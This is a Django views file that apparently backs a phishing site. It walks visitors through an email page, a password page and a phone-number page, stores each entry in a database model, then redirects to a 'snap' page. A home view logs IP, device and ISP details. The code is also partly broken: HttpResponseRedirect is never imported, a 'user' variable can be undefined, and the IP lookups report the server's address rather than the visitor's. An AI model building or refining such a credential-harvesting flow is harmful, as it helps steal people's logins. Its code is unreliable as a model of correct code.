import sys
import socket
import requests
from django.http import JsonResponse
from django.shortcuts import render, redirect
from .forms import MailForm, PassForm, PhoneNumForm
from .models import MailOrPhone
from geopy.geocoders import get_geocoder_for_service

import asyncio
from django.http import HttpResponse
from django.views import View
from django.views.generic import FormView

# Create your views here.



ipify_json_endpoint = "https://api.ipify.org/"



def LoginMail(request):
    form = MailForm()
    if request.method == 'POST':
        form = MailForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect("pass")
    context = {'form': form}
    return render(request, "index.html", context)

def LoginPass(request):
    form_pass = PassForm()
    if request.method == "POST":
        form_pass = PassForm(request.POST)
        if form_pass.is_valid():
            form_pass.save()
            return redirect("phone")
    users = MailOrPhone.objects.all()
    for user in users:
        print(user)
    passed = user
    print(user)
    context = {'form_pass': form_pass, 'user': user}
    return render(request, "pass.html", context)
            
            
def home(request):
    ip_response = requests.get('https://api.ipify.org?format=json')
    ip_address = ip_response.json()['ip']
    user_agent = request.META['HTTP_USER_AGENT']
    is_mobile = any(x in user_agent.lower() for x in ['android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 'operamini'])
    phone_name = ''
    if is_mobile:
        if 'iphone' in user_agent.lower():
            phone_name = 'iPhone'
        elif 'ipad' in user_agent.lower():
            phone_name = 'iPad'
        elif 'android' in user_agent.lower():
            phone_name = 'Android Phone/Tablet'
        elif 'blackberry' in user_agent.lower():
            phone_name = 'BlackBerry'
        elif 'windows phone' in user_agent.lower():
            phone_name = 'Windows Phone'
            
    # Get the ISP
    ipapi_response = requests.get('https://ipapi.co/json/')
    isp = ipapi_response.json()['org']
    print({
            'ip_address': ip_address,
            'user_agent': user_agent,
            'phone_name': phone_name,
            'isp': isp
        })
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    print("Your Computer Name is:" + hostname)
    print("Your Computer IP Address is:" + IPAddr)
    return render(request, "home.html")

def PhoneViews(request):
    users = MailOrPhone.objects.all()
    for user in users:
        pass
    phone_form = PhoneNumForm()
    if request.method == "POST":
        phone_form =  PhoneNumForm(request.POST)
        if phone_form.is_valid():
            phone_form.save()
            return redirect('snap')
    context = {'phone_form': phone_form, 'user': user}
    return render(request, 'phone.html', context)

class PhoneNumView(FormView):
    http_method_names = ['get', 'post']
    template_name = "ph.html"
    form_class = PhoneNumForm
    success_url = "hom"
    
    def form_valid(self, form):
        """If the form is valid, redirect to the supplied URL."""
        return HttpResponseRedirect(self.get_success_url())
    
    def get(self, request, *args, **kwargs):
        """Handle GET requests: instantiate a blank version of the form."""
        return self.render_to_response(self.get_context_data())


class AsyncView(View):
    async def get(self, request, *args, **kwargs):
        # Perform io-blocking view logic using await, sleep for example.
        await asyncio.sleep(1)
        return HttpResponse("Hello async world!")

def snap(request):
    return render(request, 'pic.html')